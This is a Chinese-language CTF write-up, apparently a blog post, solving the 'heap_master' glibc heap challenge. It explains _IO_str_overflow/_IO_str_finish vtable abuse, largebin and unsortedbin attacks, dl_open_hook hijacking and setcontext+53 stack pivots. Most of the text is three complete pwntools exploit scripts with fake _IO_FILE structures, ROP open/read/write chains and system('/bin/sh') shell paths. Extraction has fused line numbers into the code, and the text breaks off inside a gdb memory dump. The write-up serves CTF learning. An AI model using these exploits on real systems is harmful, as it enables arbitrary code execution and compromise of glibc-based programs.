__ferror(fp) = 1; */ return EOF; &#125; if (old_buf) &#123; memcpy (new_buf, old_buf, old_blen); (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf); /* Make sure _IO_setb won't try to delete _IO_buf_base. */ fp-&gt;_IO_buf_base = NULL; &#125; memset (new_buf + old_blen, '\0', new_size - old_blen); _IO_setb (fp, new_buf, new_buf + new_size, 1); fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf); fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf); fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf); fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf); fp-&gt;_IO_write_base = new_buf; fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end; &#125; &#125; if (!flush_only) *fp-&gt;_IO_write_ptr++ = (unsigned char) c; if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end) fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr; return c;&#125;libc_hidden_def (_IO_str_overflow) 我们可以固定的这么构造： 1234567_flags = 0_IO_write_ptr = 0x7fffffffffffffff //极大即可_IO_write_base = 0_IO_buf_end = (binsh_addr-100)/2 //(rdi-100)/2_IO_buf_base = 0fp+0xe0 = addr_of_func/gadget/one_gadgetfp+0xd8 = addr_of_IO_str_jumps 我们把_IO_list_all的值改为我们可控的地址，在这个地址上伪造_IO_file_plus，将vtable设为_IO_str_jumps的地址，然后当程序发生：malloc_printerr，exit()，main函数return之一时，程序就会调用：__libc_message-&gt;abort-&gt;fllush/_IO_flush_all_lockp(从_IO_list_all开始清理文件结构体)-&gt;伪造的vtable(_IO_str_jumps_addr)-&gt;调用_IO_str_overflow-&gt;获得一次任意地址call的机会。 _IO_str_finish:这个函数要比_IO_str_overflow要简单的多。 12345678void _IO_str_finish (_IO_FILE *fp, int dummy)&#123; if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF)) //唯一需要bypass的条件 (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);// getshell ， [fp+0xe8] fp-&gt;_IO_buf_base = NULL; _IO_default_finish (fp, 0);&#125; 我们可以这样构造： 1234_flags = 0_IO_buf_base = binsh_addr //rdifp+0xe8 = addr_of_func/gadget/one_gadgetfp+0xd8 = addr_of_IO_str_jumps - 8 在这道题中会显示这两个函数的具体使用方法。 第一种方法：思路：第一种方法是用largebin_attack的两次向任意地址写victim的地址，来对stdout结构体的flag(需满足f-&gt;flag &amp; 0xa00 and f-&gt;flag &amp; 0x1000 == 1)和_IO_write_base的最后一个字节（错位写入，修改_IO_read_base的前七个字节和_IO_write_base的最后一个字节，victim的地址长度不够八个字节会将缺的位自动当为零写入）进行修改，利用mmap地址的随机性（大概1/16的概率）可以泄露出mmap的地址的基址和libc的地址。 然后再利用largebin_attack向_IO_list_all写入victim的地址，在victim处伪造一个fake_IO_file_plus，利用exit()中的_IO_flush_all_lockp调用_IO_str_overflow（所以在fp+0xd8处（也就是vtable处）我们应填入_IO_str_jumps的地址），利用_IO_str_overflow中的call [rdi+0xe0]来进行程序控制流的劫持(rdi里装的是_IO_str_overflow的第一个参数fp，也就是当前的文件结构体指针)，这里因为远程只能用orw(open read write)来读取flag，但是在本地的话可以直接用one_gadget或者system(&#39;/bin/sh\x00&#39;)来打开shell，所以在exp的最后地方会有一个分支。 除此之外，我还用了上面已经说过了的_IO_str_overflow和_IO_str_finish的方法来劫持程序执行流，具体的构造方法上面已经说得很详细 ，而且可以根据具体情况自己调试来自己修改构造。对于choice = 4的orw的思路，我是借鉴了天枢e3pem学长的题解，他的文章已经说得很清晰明了，包括在libc-2.25的环境下的调试和exp学长也已经给出，我就不敢再赘述（在文末已贴出链接）。 exp如下(libc-2.23)：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'context.terminal = ['terminator','-x','sh','-c']libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def new_(p,size): p.recvuntil('&gt;&gt; ') p.sendline('1') p.recvuntil('size: ') p.sendline(str(size))def upgrade_(p,offset,content): p.recvuntil('&gt;&gt; ') p.sendline('2') p.recvuntil('offset: ') p.sendline(str(offset)) p.recvuntil('size: ') p.sendline(str(len(content))) p.recvuntil('content: ') p.send(content)def delete_(p,offset): p.recvuntil('&gt;&gt; ') p.sendline('3') p.recvuntil('offset: ') p.sendline(str(offset)) def mypwn(): while 1: try: p = process('./heap_master') new = lambda x: new_(p,x) upgrade = lambda x,y: upgrade_(p,x,y) delete = lambda x: delete_(p,x) offset = 0x5800 upgrade(offset+8,p64(0x411)) #1 upgrade(offset+8+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30,p64(0x411)) #2 upgrade(offset+8+0x410+0x30+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30,p64(0x201)) #3 upgrade(offset+8+0x410+0x30+0x410+0x30+0x200,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x410+0x30) delete(offset+0x10+0x410+0x30+0x410+0x30) new(0x10) upgrade(offset+8+0x410+0x30,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x410+0x30) new(0x60) delete(offset+0x10+0x410+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x410+0x30,p64(0x3f1)) upgrade(offset+0x10+0x410+0x30,p64(0)+p16(0x2620-0x10)) upgrade(offset+0x20+0x410+0x30,p64(0)+p16(0x2620-0x20+0x19)) delete(offset+0x10) new(0x60) p.recv(0x18) libcbase = u64(p.recv(8)) - (0x7f1f383306e0-0x7f1f37f6d000) log.success('libcbase = '+hex(libcbase)) mmap_addr = u64(p.recv(4).ljust(8,'\x00')) - (0xb800-0x6000) log.success('mmap_addr = '+hex(mmap_addr)) #------------------------------leak success and largebin_attack again--------------- _IO_list_all_addr = libcbase + 0x3c5520 _IO_str_jumps_addr = libcbase + 0x7f1517e807a0 - 0x7f1517abd000 log.success('_IO_list_all_addr = '+hex(_IO_list_all_addr)) log.success('_IO_str_jumps_addr = '+hex(_IO_str_jumps_addr)) offset = 0x8800 upgrade(offset+8,p64(0x511)) #1 upgrade(offset+8+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30,p64(0x511)) #2 upgrade(offset+8+0x510+0x30+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30,p64(0x201)) #3 upgrade(offset+8+0x510+0x30+0x510+0x30+0x200,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x510+0x30) delete(offset+0x10+0x510+0x30+0x510+0x30) new(0x10) upgrade(offset+8+0x510+0x30,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x510+0x30) new(0x60) delete(offset+0x10+0x510+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x510+0x30,p64(0x4f1)) upgrade(offset+0x10+0x510+0x30,p64(0)+p64(_IO_list_all_addr-0x10)) upgrade(offset+0x20+0x510+0x30,p64(0)+p64(_IO_list_all_addr-0x20)) delete(offset+0x10) new(0x60) #------------------------modify_IO_list_all success------------------------------- choice = 1 #1:one_gadget 2:_IO_str_finish:system('/bin/sh\x00') 3:_IO_str_overflow:system('/bin/sh\x00') 4:orw if choice == 1: one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147] upgrade(offset+0xd8,p64(_IO_str_jumps_addr)) upgrade(offset+0xe0,p64(libcbase + one_gadget[1])) if choice == 2: fake_IO_file = p64(0) #flag = 0 fake_IO_file+= p64(0)*3 fake_IO_file+= p64(0) #_IO_write_base fake_IO_file+= p64(1) #_IO_write_ptr fake_IO_file+= p64(1) #_IO_write_end fake_IO_file+= p64(mmap_addr) #_IO_buf_base = addr_of_bin_sh upgrade(0,'/bin/sh\x00') upgrade(offset,fake_IO_file) upgrade(offset+0xd8,p64(_IO_str_jumps_addr-8)) upgrade(offset+0xe8,p64(libcbase + libc.sym['system'])) if choice == 3: fake_IO_file = p64(0) #flag = 0 fake_IO_file+= p64(0)*3 fake_IO_file+= p64(0) #_IO_write_base fake_IO_file+= p64(0xffffffff) #_IO_write_ptr fake_IO_file+= p64(0) #_IO_write_end fake_IO_file+= p64(0) #_IO_buf_base = 0 fake_IO_file+= p64((mmap_addr-100)/2) #_IO_buf_base = (arry_addr-100)/2 upgrade(0,'/bin/sh\x00') upgrade(offset,fake_IO_file) upgrade(offset+0xd8,p64(_IO_str_jumps_addr)) upgrade(offset+0xe0,p64(libcbase + libc.sym['system'])) if choice == 4: p_rdi = libcbase + 0x21102 p_rdx_rsi = libcbase + 0x1150c9 p_rsp = libcbase + 0x3838 p_rsp_r13 = libcbase + 0x206c3 p_rbx_rbp_j_rdx = libcbase + 0x12d751 orw = [ p_rdi,mmap_addr, p_rdx_rsi,0,0, libcbase+libc.sym['open'], p_rdi,3, p_rdx_rsi,0x100,mmap_addr+0x1000, libcbase+libc.sym['read'], p_rdi,1, p_rdx_rsi,0x100,mmap_addr+0x1000, libcbase+libc.sym['write'], ] fake_IO_file = p64(0) fake_IO_file+= p64(p_rsp) fake_IO_file+= p64(mmap_addr+8) fake_IO_file+= p64(0) fake_IO_file+= p64(0) fake_IO_file+= p64(p_rsp_r13) upgrade(0,'./flag\x00\x00' + flat(orw)) upgrade(offset,fake_IO_file) upgrade(offset+0xd8,p64(_IO_str_jumps_addr)) upgrade(offset+0xe0,p64(p_rbx_rbp_j_rdx)) #gdb.attach(p) p.recvuntil('&gt;&gt; ') p.sendline('0') break except: p.close() p.interactive()if __name__ == '__main__': mypwn() 心得： 关于f-&gt;flag &amp; 0xa00 and f-&gt;flag &amp; 0x1000 == 1，这个flag的构造方法其实很简单，分成两部分来看，第一部分：f-&gt;flag &amp; 0xa00!=NULL，和1010 0000 0000按位与不为NULL的话，很简单只要保证是0x8xx或者0x2xx或者0xaxx就行了，这也是为什么我们看到的很多构造是flag = 0xfbad1800或者0xfbad2877啥的，其后三位都是0x8xx，第二部分：f-&gt;flag &amp; 0x1000 == 1，这个更简单了，和0001 0000 0000 0000按位与不为0即可，这个利用mmap地址的随机性随便都能成立吧。 我们选择进行largebin_attack的两块chunk的大小不能随意选择或差距过大，因为一条链的chunk大小是有范围的，（看表格你会发现好像我这道题用的chunk的size（0x4f0和0x510）明明是分在两个链上的。。但实际上那个size=0x4f0的chunk之前的size是等于0x510的，我是先把他放进去再改的大小。。。正常情况是不能这么做的。）图片来源:veritas501 一次largebin_attack可以向任意两个地址同时写victim_addr一次，一次unsortedbin_attack可以向一个任意地址写main_arena+88一次，但是写完之后这条largebin和unsortedbin都会损坏，如需继续使用我们需要注意修补。（largebin可以直接换一条链。。） 这题如果可以直接拿shell倒也不是很难，我觉得难点主要在于两方面，一方面是环境是2.25，对我这种一直用虚拟机的玩家来说怎么在ubuntu16.04上运行2.25的libc和ld.so是需要面对的第一个问题，好在这个已经得到初步解决（看e3pme的文章），一方面是orw让我们必须劫持栈rsp到mmap的我们自己已经填好rop_chain的地址上，加上找gadgets等一系列麻烦事，使难度上了一个档次。 第二种方法：第二种方法的泄露方法和第一种方法一样，但是改变了控制程序执行流的方法。 思路分析：第二种方法我们使用modify dl_open_hook的方法来劫持程序控制流，利用largebin_attack将dl_open_hook覆盖为victim的地址，因为当malloc和free报错时，会调用__libc_dlopen_mode函数，在其中会将dl_open_hook的值赋给一个寄存器，然后会call [寄存器]，也就等于是call [victim_addr]，所以我们可以在victim的地址处填好one_gadget或者gadgets来劫持程序控制流。 因为dl_open_hook赋值给的寄存器因libc版本不同而不同，我们调试发现在libc2.25中赋值给的寄存器是rbx。调试确定是哪个寄存器的方法是： rwatch *addr_dl_open_hook c 程序会卡到*addr_dl_open_hook参与操作的那一条指令。我们可以发现在libc2.25是rbx，libc2.23是rax。 我们发现在libc2.25下发现了： 1230x7FD7D: mov rdi, [rbx+48h] mov rsi, r13 call qword ptr [rbx+40h] 这个gadget我们可以完全控制住rdi和程序执行流，和setcontext+53结合，我们可以控制所有寄存器并劫持栈。 在libc-2.23版本下，我们可以找到如下gadget: 12.text:000000000006D98A mov rdi, rax.text:000000000006D98D call qword ptr [rax+20h] 所以大致思路相同，在这里只放出2.25的exp。 exp如下(libc-2.25)：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'context.terminal = ['terminator','-x','sh','-c']def change_ld(binary, ld): """ Force to use assigned new ld.so by changing the binary """ if not os.access(ld, os.R_OK): log.failure("Invalid path &#123;&#125; to ld".format(ld)) return None if not isinstance(binary, ELF): if not os.access(binary, os.R_OK): log.failure("Invalid path &#123;&#125; to binary".format(binary)) return None binary = ELF(binary) for segment in binary.segments: if segment.header['p_type'] == 'PT_INTERP': size = segment.header['p_memsz'] addr = segment.header['p_paddr'] data = segment.data() if size &lt;= len(ld): log.failure("Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;".format(data, ld)) return None binary.write(addr, ld.ljust(size, '\x00')) if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn') path = '/tmp/pwn/&#123;&#125;_debug'.format(os.path.basename(binary.path)) if os.access(path, os.F_OK): os.remove(path) info("Removing exist file &#123;&#125;".format(path)) binary.save(path) os.chmod(path, 0b111000000) #rwx------ success("PT_INTERP has changed from &#123;&#125; to &#123;&#125;. Using temp file &#123;&#125;".format(data, ld, path)) return ELF(path)elf = change_ld('./heap_master','./ld-linux-x86-64.so.2')p = elf.process(env=&#123;'LD_PRELOAD':'./libc-2.25.so'&#125;)def new(size): p.recvuntil('&gt;&gt; ') p.sendline('1') p.recvuntil('size: ') p.sendline(str(size))def upgrade(offset,content): p.recvuntil('&gt;&gt; ') p.sendline('2') p.recvuntil('offset: ') p.sendline(str(offset)) p.recvuntil('size: ') p.sendline(str(len(content))) p.recvuntil('content: ') p.send(content)def delete(offset): p.recvuntil('&gt;&gt; ') p.sendline('3') p.recvuntil('offset: ') p.sendline(str(offset)) def mypwn(): stdout = 0x2600 libc = ELF('./libc-2.25.so') offset = 0x5800 upgrade(offset+8,p64(0x411)) #1 upgrade(offset+8+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30,p64(0x411)) #2 upgrade(offset+8+0x410+0x30+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30,p64(0x201)) #3 upgrade(offset+8+0x410+0x30+0x410+0x30+0x200,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x410+0x30) delete(offset+0x10+0x410+0x30+0x410+0x30) new(0x10) upgrade(offset+8+0x410+0x30,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x410+0x30) new(0x60) delete(offset+0x10+0x410+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x410+0x30,p64(0x3f1)) upgrade(offset+0x10+0x410+0x30,p64(0)+p16(stdout-0x10)) upgrade(offset+0x20+0x410+0x30,p64(0)+p16(stdout-0x20+0x19)) delete(offset+0x10) new(0x60) mmap_addr = u64(p.recv(8)) - (0xdffa3800- 0xdff9e000) log.success('mmap_addr = '+hex(mmap_addr)) libcbase = u64(p.recv(8)) - (0x7f7684c72683-0x7f76848d4000) log.success('libcbase = '+hex(libcbase)) setcontext = libcbase + 0x43565 log.success('setcontext+53 = '+hex(setcontext)) dl_open_hook_addr = libcbase + (0x7fa15b2162e0-0x7fa15ae74000) log.success('dl_open_hook_addr = '+hex(dl_open_hook_addr)) offset = 0x8800 upgrade(offset+8,p64(0x511)) #1 upgrade(offset+8+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30,p64(0x511)) #2 upgrade(offset+8+0x510+0x30+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30,p64(0x201)) #3 upgrade(offset+8+0x510+0x30+0x510+0x30+0x200,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x510+0x30) delete(offset+0x10+0x510+0x30+0x510+0x30) new(0x10) upgrade(offset+8+0x510+0x30,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x510+0x30) new(0x60) delete(offset+0x10+0x510+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x510+0x30,p64(0x4f1)) upgrade(offset+0x10+0x510+0x30,p64(0)+p64(dl_open_hook_addr-0x10)) upgrade(offset+0x20+0x510+0x30,p64(0)+p64(dl_open_hook_addr-0x20)) delete(offset+0x10) new(0x60) choice = 2 #1. one_gadget 全部失败 2. orw if choice == 1: one_gadget = [0x40bdb,0x40c2f,0xd9925] upgrade(offset,p64(libcbase+one_gadget[2])) if choice == 2: ''' 0x7ffff7a7a565 &lt;setcontext+53&gt;: mov rsp,QWORD PTR [rdi+0xa0] 0x7ffff7a7a56c &lt;setcontext+60&gt;: mov rbx,QWORD PTR [rdi+0x80] 0x7ffff7a7a573 &lt;setcontext+67&gt;: mov rbp,QWORD PTR [rdi+0x78] 0x7ffff7a7a577 &lt;setcontext+71&gt;: mov r12,QWORD PTR [rdi+0x48] 0x7ffff7a7a57b &lt;setcontext+75&gt;: mov r13,QWORD PTR [rdi+0x50] 0x7ffff7a7a57f &lt;setcontext+79&gt;: mov r14,QWORD PTR [rdi+0x58] 0x7ffff7a7a583 &lt;setcontext+83&gt;: mov r15,QWORD PTR [rdi+0x60] 0x7ffff7a7a587 &lt;setcontext+87&gt;: mov rcx,QWORD PTR [rdi+0xa8] 0x7ffff7a7a58e &lt;setcontext+94&gt;: push rcx 0x7ffff7a7a58f &lt;setcontext+95&gt;: mov rsi,QWORD PTR [rdi+0x70] 0x7ffff7a7a593 &lt;setcontext+99&gt;: mov rdx,QWORD PTR [rdi+0x88] 0x7ffff7a7a59a &lt;setcontext+106&gt;: mov rcx,QWORD PTR [rdi+0x98] 0x7ffff7a7a5a1 &lt;setcontext+113&gt;: mov r8,QWORD PTR [rdi+0x28] 0x7ffff7a7a5a5 &lt;setcontext+117&gt;: mov r9,QWORD PTR [rdi+0x30] 0x7ffff7a7a5a9 &lt;setcontext+121&gt;: mov rdi,QWORD PTR [rdi+0x68] 0x7ffff7a7a5ad &lt;setcontext+125&gt;: xor eax,eax 0x7ffff7a7a5af &lt;setcontext+127&gt;: ret ''' mygadget = 0x7fd7d + libcbase #0x000000000007fd7d: mov rdi, qword ptr [rbx + 0x48]; mov rsi, r13; call qword ptr [rbx + 0x40]; p_rdi = libcbase + 0x1feea p_rdx_rsi = libcbase + 0xf9619 orw = [ p_rdi,mmap_addr, p_rdx_rsi,0,0, libcbase+libc.sym['open'], p_rdi,4, #我flag打开之后文件操作符是4，具体情况自己调试 p_rdx_rsi,0x100,mmap_addr+0x2000, libcbase+libc.sym['read'], p_rdi,1, p_rdx_rsi,0x100,mmap_addr+0x2000, libcbase+libc.sym['write'], ] upgrade(0,'./flag\x00\x00'+flat(orw)) upgrade(offset,p64(mygadget)) upgrade(offset+0x40,p64(setcontext)+p64(mmap_addr+0x1000)) upgrade(0x1000+0xa0,p64(mmap_addr+0x10)+p64(p_rdi)) #gdb.attach(p) delete(0x10) p.interactive()while True: try: mypwn() break except: p.close() elf = change_ld('./heap_master','./ld-linux-x86-64.so.2') p = elf.process(env=&#123;'LD_PRELOAD':'./libc-2.25.so'&#125;) 第三种方法：思路：第三种方法主要与前面的泄露方式不同。 第三种方法是先利用unsortedbin_attack/largebin_attack将任意地址修改为victim的地址，我们准备改写global_fast_max，然后突破fastbinY[]的限制，产生fastbin_index_overflow将stdout流modify为某一处mmap的地址（我们事先已应在这里伪造好一个fake_IO_2_1_stdout结构体），然后有1/16的概率可以成功泄露。 这种方法的exp本体来源：https://paper.seebug.org/935/，其中值得注意的一点是其用到了__morecore来进行了一个巧妙的劫持，如下： 123456789101112131415161718190x7f09c5962308 &lt;main_arena+2024&gt;: 0x00007f09c59622f8 0x00007f09c59622f80x7f09c5962318 &lt;main_arena+2040&gt;: 0x00007f09c5962308 0x00007f09c59623080x7f09c5962328 &lt;main_arena+2056&gt;: 0x00007f09c5962318 0x00007f09c59623180x7f09c5962338 &lt;main_arena+2072&gt;: 0x00007f09c5962328 0x00007f09c59623280x7f09c5962348 &lt;main_arena+2088&gt;: 0x00007f09c5962338 0x00007f09c59623380x7f09c5962358 &lt;main_arena+2104&gt;: 0x00007f09c5962348 0x00007f09c59623480x7f09c5962368 &lt;main_arena+2120&gt;: 0x00007f09c5962358 0x00007f09c59623580x7f09c5962378 &lt;main_arena+2136&gt;: 0x0000000000000000 0x00000000000000000x7f09c5962388 &lt;main_arena+2152&gt;: 0x00007f09c5961b20 0x00000000000000000x7f09c5962398 &lt;main_arena+2168&gt;: 0x0000000000000001 0x00000000000210000x7f09c59623a8 &lt;main_arena+2184&gt;: 0x000000008b2f3000 0x00007f09c56248c00x7f09c56248c0 &lt;__GI___default_morecore&gt;: sub rsp,0x80x7f09c56248c4 &lt;__GI___default_morecore+4&gt;: call 0x7f09c5699e80 &lt;__GI___sbrk&gt;0x7f09c56248c9 &lt;__GI___default_morecore+9&gt;: mov edx,0x00x7f09c56248ce &lt;__GI___default_morecore+14&gt;: cmp rax,0xffffffffffffffff0x7f09c56248d2 &lt;__GI___default_morecore+18&gt;: cmove rax,rdx0x7f09c56248d6 &lt;__GI___default_morecore+22&gt;: add rsp,0x80x7f09c56248da &lt;__GI___default_morecore+26&gt;: ret 由代码可见，在main_arena+2024处，*（main_arena+2024+0xa8）为__GI_default_morecore函数，而这个函数我们调试看一下，其实就等于是一个ret的gadget，因为sub rsp,0x8和add rsp,0x8抵消了，所以我们把main_arena+2024作为setcontext+53的初始rdi，并在main_arena+2024+0xa0处利用fastbin_index_overflow设为我们构造好rop_chain的地址，当setcontext+53的最后我们的程序执行流跳到*(rdi+0xa8)时（此时rsp已经指向rop_chain），我们就等于跳到了一个ret的gadget上，所以程序直接开始执行rop_chain。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172#coding:utf-8from pwn import *p = process('./heap_master')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')context(os='linux',arch='amd64')context.terminal = ['terminator','-x','sh','-c']def new(size): p.sendlineafter('&gt;&gt; ', '1') p.sendlineafter('size: ', str(size))def upgrade(off,cont): p.sendlineafter('&gt;&gt; ', '2') p.sendlineafter('offset: ', str(off)) p.sendlineafter('size: ', str(len(cont))) p.sendafter('content: ', cont) def delete(off): p.sendlineafter('&gt;&gt; ', '3') p.sendlineafter('offset: ', str(off))def exp(): for i in range(0xe): upgrade(0xf8 + i*0x10,p64(0x201)) for i in range(0x10): upgrade(0x2f8 + i*0x10,p64(0x21)) for i in range(0xd): delete(0x1d0-i*0x10) new(0x1f0) upgrade(0x100, p64(0xfbad1800) + p16(0x26a3)) upgrade(0x110,p16(0x26a3)) upgrade(0x118,p16(0x26a3)) upgrade(0x120,p16(0x2618)) upgrade(0x128,p16(0x26a3)) upgrade(0x130,p16(0x26a3)) upgrade(0x138,p16(0x26a3)) upgrade(0x140,p16(0x26a3)) upgrade(0x148, p64(0)*4 + p16(0x18e0)) upgrade(0x170, p64(1) + p64(0xffffffffffffffff) + p64(0xa000000) + p16(0x3780)) upgrade(0x190, p64(0xffffffffffffffff) + p64(0) + p16(0x17a0)) upgrade(0x1a8,p64(0)*3 + p64(0x00000000ffffffff) + p64(0)*2 + p16(0x06e0)) #~~~~~~~~~~~~~~~~~~~~~~fake_IO_2_1_stdout_create_success and begin unsortedbin_attack~~~~~~~~~~~~~~~~~~~~~~~~~ upgrade(0x1000+8,p64(0x91)) upgrade(0x1000+8+0x90,p64(0x21)) upgrade(0x1000+8+0x90+0x20,p64(0x21)) delete(0x1010) global_max_fast = 0x37f8 upgrade(0x1018,p16(global_max_fast-0x10)) #unsortbin attack global_max_fast new(0x80) upgrade(0x100+8,p64(0x17e1)) upgrade(0x100+8+0x17e0,p64(0x21)) upgrade(0x100+8+0x17e0+0x20,p64(0x21)) delete(0x110) libcbase = u64(p.recv(6).ljust(8,'\x00')) - 3946208 log.success('libcbase = '+hex(libcbase)) IO_str_j = libcbase + libc.sym['_IO_file_jumps']+0xc0 morecore = libcbase + libc.sym['__morecore'] - 8 - 0xa0 log.success('_IO_str_jumps = '+hex(IO_str_j)) log.success('morecore = '+hex(morecore)) setcontext = libcbase + 293749 log.success('setcontext = '+hex(setcontext)) upgrade(0x2008,p64(0x1411)) # unsortedbin_attack modify _IO_list_all to mmap+0x2000 upgrade(0x3418,p64(0x21)) delete(0x2010) _IO_FILE = ( p64(0) + p64(0)*3 + p64(0) + # + 0x20 write_base p64(0x7fffffffffffffff) + # write_ptr p64(0x0) + p64(0) + # + 0x38 buf_base p64((morecore - 100) / 2) + # rdi buf_end p64(0)*0x12 + p64(IO_str_j) + # + 0xd8 p64(setcontext)) #构造方法看前面的部分 upgrade(0x2000,_IO_FILE) upgrade(0x3000+8,p64(0x1121)) #unsortedbin_attack modify morecore+0xa0 to mmap+0x3000 upgrade(0x3000+8+0x1120,p64(0x21)) delete(0x3010) ''' 0x7ff5bae14b75 &lt;setcontext+53&gt;: mov rsp,QWORD PTR [rdi+0xa0] 0x7ff5bae14b7c &lt;setcontext+60&gt;: mov rbx,QWORD PTR [rdi+0x80] 0x7ff5bae14b83 &lt;setcontext+67&gt;: mov rbp,QWORD PTR [rdi+0x78] 0x7ff5bae14b87 &lt;setcontext+71&gt;: mov r12,QWORD PTR [rdi+0x48] 0x7ff5bae14b8b &lt;setcontext+75&gt;: mov r13,QWORD PTR [rdi+0x50] 0x7ff5bae14b8f &lt;setcontext+79&gt;: mov r14,QWORD PTR [rdi+0x58] 0x7ff5bae14b93 &lt;setcontext+83&gt;: mov r15,QWORD PTR [rdi+0x60] 0x7ff5bae14b97 &lt;setcontext+87&gt;: mov rcx,QWORD PTR [rdi+0xa8] 0x7ff5bae14b9e &lt;setcontext+94&gt;: push rcx 0x7ff5bae14b9f &lt;setcontext+95&gt;: mov rsi,QWORD PTR [rdi+0x70] 0x7ff5bae14ba3 &lt;setcontext+99&gt;: mov rdx,QWORD PTR [rdi+0x88] 0x7ff5bae14baa &lt;setcontext+106&gt;: mov rcx,QWORD PTR [rdi+0x98] 0x7ff5bae14bb1 &lt;setcontext+113&gt;: mov r8,QWORD PTR [rdi+0x28] 0x7ff5bae14bb5 &lt;setcontext+117&gt;: mov r9,QWORD PTR [rdi+0x30] 0x7ff5bae14bb9 &lt;setcontext+121&gt;: mov rdi,QWORD PTR [rdi+0x68] 0x7ff5bae14bbd &lt;setcontext+125&gt;: xor eax,eax 0x7ff5bae14bbf &lt;setcontext+127&gt;: ret ''' pop_rax = libcbase + 0x0000000000033544 pop_rdi = libcbase + 0x0000000000021102 pop_rsi = libcbase + 0x00000000000202e8 pop_rdx = libcbase + 0x0000000000001b92 syscall = libcbase + 0x00000000000bc375 buf = libcbase + 3954496 rop = (p64(pop_rax) + p64(0) + # read "/flag" ; open read write p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(buf) + p64(pop_rdx) + p64(0x100) + p64(syscall) + p64(pop_rax) + p64(2) + p64(pop_rdi) + p64(buf) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(syscall) + p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(buf) + p64(pop_rdx) + p64(100) + p64(syscall) + p64(pop_rax) + p64(1) + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(buf) + p64(pop_rdx) + p64(100) + p64(syscall)) upgrade(0x3000,rop) ''' 0x7f09c5962308 &lt;main_arena+2024&gt;: 0x00007f09c59622f8 0x00007f09c59622f8 0x7f09c5962318 &lt;main_arena+2040&gt;: 0x00007f09c5962308 0x00007f09c5962308 0x7f09c5962328 &lt;main_arena+2056&gt;: 0x00007f09c5962318 0x00007f09c5962318 0x7f09c5962338 &lt;main_arena+2072&gt;: 0x00007f09c5962328 0x00007f09c5962328 0x7f09c5962348 &lt;main_arena+2088&gt;: 0x00007f09c5962338 0x00007f09c5962338 0x7f09c5962358 &lt;main_arena+2104&gt;: 0x00007f09c5962348 0x00007f09c5962348 0x7f09c5962368 &lt;main_arena+2120&gt;: 0x00007f09c5962358 0x00007f09c5962358 0x7f09c5962378 &lt;main_arena+2136&gt;: 0x0000000000000000 0x0000000000000000 0x7f09c5962388 &lt;main_arena+2152&gt;: 0x00007f09c5961b20 0x0000000000000000 